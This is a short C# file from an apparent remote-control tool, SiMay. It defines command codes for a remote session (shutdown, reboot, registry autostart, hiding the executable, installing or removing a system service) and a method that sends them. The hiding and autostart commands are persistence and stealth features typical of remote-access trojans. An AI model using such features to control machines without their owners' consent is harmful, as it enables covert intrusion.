using SiMay.Net.SessionProvider;
using System;
using System.Collections.Generic;
using System.Text;
using System.Threading.Tasks;

namespace SiMay.RemoteControls.Core
{
    public class WsStatusSimpleApplication : SimpleApplicationBase
    {
        /// <summary>
        /// 关机
        /// </summary>
        public const int SYS_SHUTDOWN = 0;

        /// <summary>
        /// 重启
        /// </summary>
        public const int SYS_REBOOT = 1;

        /// <summary>
        /// 自启动
        /// </summary>
        public const int REG_AUTO_START = 2;

        /// <summary>
        /// 取消自启动
        /// </summary>
        public const int REG_CANCEL_AUTO_START = 3;

        /// <summary>
        /// 隐藏文件
        /// </summary>
        public const int ATTRIB_EXE_HIDE = 4;

        /// <summary>
        /// 显示文件
        /// </summary>
        public const int ATTRIB_EXE_SHOW = 5;

        /// <summary>
        /// 卸载程序
        /// </summary>
        public const int UNINSTALL_SERVICE = 6;

        /// <summary>
        /// 安装启动服务
        /// </summary>
        public const int INSTALL_SYS_SERVICE = 7;

        /// <summary>
        /// 卸载服务
        /// </summary>
        public const int UNINSTALL_SYS_SERVICE = 8;

        /// <summary>
        /// 服务重启
        /// </summary>
        public const int SERVICE_RELOADER = 9;

        public async Task SetWsSession(SessionProviderContext session, int state)
        {
            await CallSimpleService(session, SiMay.Core.MessageHead.S_SIMPLE_SET_SESSION_STATUS, state.ToString());
        }
    }
}
